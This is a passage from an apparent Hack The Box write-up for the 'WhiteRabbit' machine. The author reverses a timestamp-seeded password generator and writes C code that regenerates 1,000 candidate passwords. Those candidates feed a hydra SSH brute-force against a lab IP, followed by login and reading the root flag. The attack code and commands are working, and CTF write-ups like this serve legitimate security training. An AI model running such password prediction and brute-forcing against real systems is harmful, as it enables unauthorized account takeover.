There is the `gettimeofday()` function which saves, at the address of `local_28`, the value in the format `2024-08-30 14:40:42 UTC+0`. Checking the `generate_password()` function...

![ghidra-2](/htb/season7/whiterabbit/img/image11.png "ghidra-2")

the timestamp is used as a seed to generate a value and select from alphanumeric characters.

We reconstruct the program using the timestamp taken from the log table and generate all the passwords for each millisecond of that time window.
```c
#include <stdio.h>
#include <stdlib.h>
#include <time.h>

#define PASSWORD_LENGTH 20
#define CHARSET "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
#define CHARSET_SIZE 62

void generate_password(unsigned int seed, char *password) {
    srand(seed);
    for (int i = 0; i < PASSWORD_LENGTH; i++) {
        int index = rand();
        password[i] = CHARSET[index % 62];
    }
    password[PASSWORD_LENGTH] = '\0';
}

int main() {
    // Tempo: 2024-08-30 14:40:42
    struct tm tm_time = {
        .tm_year = 2024 - 1900,
        .tm_mon = 8-1,
        .tm_mday = 30,
        .tm_hour = 14,
        .tm_min = 40,
        .tm_sec = 42
    };

    time_t base_seconds = timegm(&tm_time); // tv_sec
    printf("Secondi: %ld", base_seconds);
    if (base_seconds == -1) {
        perror("Errore nel calcolo del timestamp");
        return 1;
    }

    FILE *file = fopen("neo_passwords.txt", "w");
    if (!file) {
        perror("Errore nell'apertura del file");
        return 1;
    }

    char password[PASSWORD_LENGTH + 1];

    for (int ms = 0; ms < 1000; ms++) {
        generate_password((base_seconds * 1000) + ms, password);
        fprintf(file, "%s\n", password);
    }

    fclose(file);

    printf("Password generate in neo_passwords.txt\n");
    return 0;
}
```

We compile, execute, and run **hydra** using the generated text file.

```bash
hydra -l neo -P neo_passwords.txt ssh://10.10.11.63:22 -vV -t 10
```
```
[ATTEMPT] target 10.10.11.63 - login "neo" - pass "R5DCgYNkgzXKwQauK2rK" - 39 of 1000 [child 9] (0/0)
[ATTEMPT] target 10.10.11.63 - login "neo" - pass "P3x2EnufU74LgDFrFQ5p" - 40 of 1000 [child 8] (0/0)
[22][ssh] host: 10.10.11.63   login: neo   password: WBSxhWgfnMiclrV4dqfj
[STATUS] attack finished for 10.10.11.63 (waiting for children to complete tests)
1 of 1 target successfully completed, 1 valid password found
```

### Post-Exploitation

Now we are inside the `neo` profile.

```bash
$ ssh neo@10.10.11.63
```
```
neo@10.10.11.63's password: 
Welcome to Ubuntu 24.04.2 LTS (GNU/Linux 6.8.0-57-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Sun Apr 13 15:12:09 2025 from 10.10.16.54
```
```bash
neo@whiterabbit:~$ sudo cat /root/root.txt
```
```
[sudo] password for neo: 
10**********************REDACTED
```
